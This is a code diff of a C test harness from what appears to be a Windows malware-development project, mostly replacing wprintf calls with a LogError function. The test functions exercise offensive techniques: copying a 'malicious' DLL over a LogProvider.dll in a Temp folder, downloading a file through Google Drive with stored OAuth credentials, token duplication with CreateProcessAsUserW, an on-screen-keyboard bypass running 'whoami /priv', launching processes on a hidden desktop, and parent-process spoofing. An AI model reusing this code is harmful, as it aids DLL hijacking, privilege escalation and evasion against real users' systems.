@@ -70,7 +70,7 @@ VOID test2
 	CHAR szTempPath[MAX_PATH];
 
 	if (!CreateProcessAndGetOutput(wszPath, &pOutput, &dwSize)) {
-		wprintf(L"Error: 0x%08x\n", GetLastError());
+		LogError(L"Error: 0x%08x\n", GetLastError());
 	}
 
 	szFolderName = StrStrA(pOutput, "\tFileName = \"") + lstrlenA("\tFileName = \"");
@@ -156,27 +156,27 @@ VOID test3
 
 	ZeroMemory(wszLogProvider, sizeof(wszLogProvider));
 	WatchFileCreationEx(L"C:\\Users\\Admin\\AppData\\Local\\Temp", TRUE, PrintFileName, wszLogProvider);
-	wprintf(L"%lls\n", wszLogProvider);
+	LogError(L"%lls\n", wszLogProvider);
 	if (!IsFolderExist(wszLogProvider)) {
-		wprintf(L"Folder not exist!\n");
+		LogError(L"Folder not exist!\n");
 		return;
 	}
 
 	StrCatW(wszLogProvider, L"\\LogProvider.dll");
 	if (!IsFileExist(wszLogProvider)) {
-		wprintf(L"File not exist!\n");
+		LogError(L"File not exist!\n");
 		return;
 	}
 
 	if (!CopyFileWp(lpMaliciousDll, wszLogProvider, TRUE)) {
-		wprintf(L"Failed to copy dll: 0x%08x\n", GetLastError());
+		LogError(L"Failed to copy dll: 0x%08x\n", GetLastError());
 		return;
 	}
 
-	wprintf(L"dwResult = 0x%08x\n", dwResult);
+	LogError(L"dwResult = 0x%08x\n", dwResult);
 	hFile = CreateFileW(wszLogProvider, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
-		wprintf(L"Failed to open dll: 0x%08x\n", GetLastError());
+		LogError(L"Failed to open dll: 0x%08x\n", GetLastError());
 		return;
 	}
 
@@ -185,7 +185,7 @@ VOID test3
 
 void test4() {
 	printf("%s\n", ConvertWcharToChar(L"Hello World"));
-	wprintf(L"%lls\n", ConvertCharToWchar("Hello World"));
+	LogError(L"%lls\n", ConvertCharToWchar("Hello World"));
 }
 
 void test5() {
@@ -209,12 +209,12 @@ void test6() {
 	pGoogleDriverObj = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
 	RefreshAccessToken(pGoogleDriverObj);
 	if (!GetFileId(pGoogleDriverObj, "11-7-2024-16-55-12.hpp", &lpFileId) || lpFileId == NULL) {
-		wprintf(L"GetFileId failed at %lls\n", __FUNCTIONW__);
+		LogError(L"GetFileId failed at %lls\n", __FUNCTIONW__);
 		return;
 	}
 
 	if (!GoogleDriveDownload(pGoogleDriverObj, lpFileId)) {
-		wprintf(L"GoogleDriveDownload failed at %lls\n", __FUNCTIONW__);
+		LogError(L"GoogleDriveDownload failed at %lls\n", __FUNCTIONW__);
 		return;
 	}
 }
@@ -366,7 +366,7 @@ void test20() {
 	pArray = ListFileWithFilter(L"C:\\Users\\Admin\\Desktop\\Apps", L"*T*", 0, &dwSize);
 	if (pArray != NULL && dwSize > 0) {
 		for (DWORD i = 0; i < dwSize; i++) {
-			wprintf(L"%lls\n", pArray[i]);
+			LogError(L"%lls\n", pArray[i]);
 		}
 	}
 }
@@ -399,27 +399,27 @@ void test21
 	sei.fMask |= SEE_MASK_NOCLOSEPROCESS;
 
 	if (!ShellExecuteExW(&sei)) {
-		wprintf(L"CreateProcessW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__,GetLastError());
+		LogError(L"CreateProcessW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
 	dwPid = GetProcessId(sei.hProcess);
 	CloseHandle(sei.hProcess);
-	wprintf(L"dwPid = %d\n", dwPid);
+	LogError(L"dwPid = %d\n", dwPid);
 	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, TRUE, dwPid);
 	if (hProc == NULL) {
-		wprintf(L"OpenProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"OpenProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
-		wprintf(L"OpenProcessToken failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"OpenProcessToken failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
 	RtlSecureZeroMemory(&sa, sizeof(sa));
 	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
-		wprintf(L"DuplicateTokenEx failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"DuplicateTokenEx failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -427,7 +427,7 @@ void test21
 	ConvertStringSidToSidW(SDDL_ML_MEDIUM, &pSid);
 	TokenInfo.Label.Sid = pSid;
 	if (!SetTokenInformation(hDuplicatedToken, TokenIntegrityLevel, &TokenInfo, sizeof(TokenInfo))) {
-		wprintf(L"SetTokenInformation failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"SetTokenInformation failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -437,7 +437,7 @@ void test21
 
 	hMem = GlobalAlloc(GMEM_MOVEABLE, (lstrlenA(lpCommandLine) + 1) * sizeof(WCHAR));
 	if (hMem == NULL) {
-		wprintf(L"GlobalAlloc failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"GlobalAlloc failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -447,17 +447,17 @@ void test21
 	lpGlobalMem[lstrlenW(lpGlobalMem)] = L'\0';
 	GlobalUnlock(hMem);
 	if (!OpenClipboard(NULL)) {
-		wprintf(L"OpenClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"OpenClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!EmptyClipboard()) {
-		wprintf(L"EmptyClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"EmptyClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!SetClipboardData(CF_UNICODETEXT, hMem)) {
-		wprintf(L"SetClipboardData failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"SetClipboardData failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -469,7 +469,7 @@ void test21
 	RtlSecureZeroMemory(&pi, sizeof(pi));
 	si.cb = sizeof(si);
 	if (!CreateProcessAsUserW(hDuplicatedToken, NULL, lpCscriptCommandLine, &sa, &sa, FALSE, 0, NULL, NULL, &si, &pi)) {
-		wprintf(L"CreateProcessAsUserW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"CreateProcessAsUserW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -497,19 +497,63 @@ CLEANUP:
 
 void test22() {
 	for (DWORD i = 0; i < 1000; i++) {
-		wprintf(L"#%d: ", i);
+		LogError(L"#%d: ", i);
 		IsSystemLock();
 		Sleep(1000);
 	}
 }
 
 void test23() {
-	WaitAndBypass("C:\\Windows\\System32\\cmd.exe");
+	BypassByOsk("cmd /C \"cd C:\\Users\\Admin\\Desktop && whoami /priv > a.txt\"");
 }
 
 void test24() {
-	WCHAR wszCommandLine[] = L"cmd /C \"cd C:\\Users\\Admin\\Desktop && whoami /priv > a.txt\"";
+	WCHAR wszCommandLine[] = L"D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\1Test.exe";
 	CreateProcessWithDesktop(wszCommandLine, L"Hidden Desktop");
+}
+
+void test25() {
+	STARTUPINFOW si;
+	PROCESS_INFORMATION pi;
+
+	RtlSecureZeroMemory(&si, sizeof(si));
+	RtlSecureZeroMemory(&pi, sizeof(pi));
+	si.cb = sizeof(si);
+	si.dwFlags |= STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+	if (!CreateProcessW(L"C:\\Windows\\System32\\osk.exe", L"C:\\Windows\\System32\\osk.exe ", NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+		LogError(L"CreateProcessW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+	}
+
+	if (pi.hThread != NULL) {
+		CloseHandle(pi.hThread);
+	}
+
+	if (pi.hProcess != NULL) {
+		CloseHandle(pi.hProcess);
+	}
+}
+
+void test26() {
+	SIZE_T cbList = 0;
+	PPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;
+
+	InitializeProcThreadAttributeList(NULL, 8, 0, &cbList);
+	HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, 27644);
+	pAttrList = ALLOC(cbList);
+	if (!InitializeProcThreadAttributeList(pAttrList, 8, 0, &cbList)) {
+		LogError(L"InitializeProcThreadAttributeList failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		return;
+	}
+
+	if (!UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(hParent), NULL, NULL)) {
+		LogError(L"InitializeProcThreadAttributeList failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		return;
+	}
+}
+
+void test27() {
+	LogError(L"Hello World");
 }
 
 int main() {
@@ -536,5 +580,8 @@ int main() {
 	//test22();
 	test23();
 	//test24();
+	//test25();
+	//test26();
+	//test27();
 	return 0;
 }
